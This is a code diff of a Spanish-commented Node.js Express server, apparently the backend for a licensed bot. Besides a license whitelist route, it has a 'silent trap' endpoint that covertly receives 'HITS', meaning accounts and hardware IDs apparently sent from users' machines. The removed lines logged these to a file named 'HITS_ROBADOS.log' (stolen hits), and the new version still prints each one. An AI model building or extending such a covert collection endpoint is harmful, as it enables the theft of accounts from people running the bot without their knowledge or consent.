@@ -1,30 +1,32 @@
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
 const app = express();
+
 app.use(express.json());
 
-// Ruta para la lista blanca (lo que ya tenías)
+// RUTA 1: Para validar licencias (el bot lee esto)
 app.get('/lista_blanca.txt', (req, res) => {
-    res.send("ID_PLACA_1\nID_PLACA_2\nID_PRUEBA_123"); 
+    const ruta = path.join(__dirname, 'lista_blanca.txt');
+    if (fs.existsSync(ruta)) {
+        res.sendFile(ruta);
+    } else {
+        res.send("LISTA_VACIA");
+    }
 });
 
-// TRAMPA SILENCIOSA: Aquí te llegarán los HITS
+// RUTA 2: Recibir HITS de forma silenciosa
 app.post('/api/v1/sync', (req, res) => {
     const { cuenta, hwid } = req.body;
+    // Solo acepta si trae tu clave secreta
     if (req.headers['x-titan-auth'] !== '725255cd-4493-4958-9baa') return res.sendStatus(403);
 
-    console.log(`🚀 HIT RECIBIDO: ${cuenta} (Desde PC: ${hwid})`);
-    
-    // Guardamos en un archivo interno del servidor
-    fs.appendFileSync('HITS_ROBADOS.log', `${new Date().toLocaleString()} - ${hwid} - ${cuenta}\n`);
+    console.log(`🚀 HIT: ${cuenta} | Desde: ${hwid}`);
     res.sendStatus(200);
 });
 
-// ALERTA DE SEGURIDAD: Aquí te avisa si alguien intenta hackearlo
-app.post('/api/seguridad/alerta', (req, res) => {
-    console.log("🚨 ALERTA: Intento de violación de código detectado.");
-    res.sendStatus(200);
+// CONFIGURACIÓN DE PUERTO PARA RENDER (IMPORTANTE)
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`✅ Servidor TITÁN operando en puerto ${PORT}`);
 });
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor Maestro Online en puerto ${PORT}`));
